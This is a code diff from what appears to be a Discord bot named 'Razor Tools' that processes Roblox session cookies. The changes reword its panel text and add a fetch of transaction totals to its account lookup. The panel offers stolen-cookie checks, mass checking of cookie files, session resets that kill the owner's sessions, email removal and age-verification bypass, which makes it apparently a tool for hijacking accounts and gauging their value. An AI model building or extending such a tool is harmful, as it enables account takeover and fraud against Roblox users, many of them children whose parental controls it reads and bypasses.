@@ -32,9 +32,9 @@ function buildPanelEmbed() {
     '𖣐 Razor Tools Serving',
     '✧ **Welcome to Razor Tools**\n' +
     '────\n' +
-    '⭑ Select!\n' +
-    '⭑ No Question Further.\n' +
-    '⭑ Results In DM | Server\n' +
+    '⭑ Select an action from the dropdown below.\n' +
+    '⭑ You will be asked for credentials and delivery method.\n' +
+    '⭑ Results can be sent via DM or posted in this channel.\n' +
     '────\n' +
     '✧ **Commands:**\n' +
     '• Login – Check Account Info\n' +
@@ -58,26 +58,26 @@ function buildPanelSelect() {
       new StringSelectMenuOptionBuilder()
         .setLabel('🔄 Reset Session')
         .setValue('reset')
-        .setDescription('Kill Sessions & Get Fresh One'),
+        .setDescription('Kill old sessions and get fresh cookie'),
       new StringSelectMenuOptionBuilder()
         .setLabel('⚡ Bypass')
         .setValue('bypass')
-        .setDescription('Attempt Emails Removing'),
+        .setDescription('Attempt age verification bypass'),
       new StringSelectMenuOptionBuilder()
         .setLabel('📂 Mass Check')
         .setValue('check')
-        .setDescription('Checks Files Of Cookies'),
+        .setDescription('Upload a file of cookies (use /check directly)'),
       new StringSelectMenuOptionBuilder()
         .setLabel('🧹 Clear Cookie')
         .setValue('clear')
-        .setDescription('Clear Cookies Format')
+        .setDescription('Extract raw cookie from messy text')
     );
   return new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(select);
 }
 
 const data = new SlashCommandBuilder()
   .setName('panel')
-  .setDescription('Razor Tools Serving..')
+  .setDescription('Open the Razor Tools control panel')
   .setDefaultMemberPermissions('0') as SlashCommandBuilder;
 
 async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
@@ -191,12 +191,14 @@ async function handleModal(interaction: ModalSubmitInteraction): Promise<void> {
 
     switch (action) {
       case 'login': {
-        const age = await Roblox.getUserAge(validation.userId!);
-        const robux = await Roblox.fetchRobux(cookie, String(validation.userId!));
+        const userId = validation.userId!;
+        const age = await Roblox.getUserAge(userId);
+        const robux = await Roblox.fetchRobux(cookie, String(userId));
+        const summary = await Roblox.fetchTransactionTotals(cookie, String(userId));
         const country = await Roblox.fetchCountry(cookie);
         const email = await Roblox.fetchEmailInfo(cookie);
         const parental = await Roblox.fetchParentalControls(cookie);
-        const thumb = await Roblox.fetchAvatarThumbnail(String(validation.userId!));
+        const thumb = await Roblox.fetchAvatarThumbnail(String(userId));
 
         let emailStatus = 'No email found';
         if (email.verified) emailStatus = `✅ Verified: \`${email.verified}\``;
@@ -207,9 +209,10 @@ async function handleModal(interaction: ModalSubmitInteraction): Promise<void> {
         const embed = buildAccountEmbed(
           validation.username!,
           validation.displayName || null,
-          validation.userId!,
+          userId,
           age,
           robux,
+          summary,
           country,
           emailStatus,
           parentStatus,
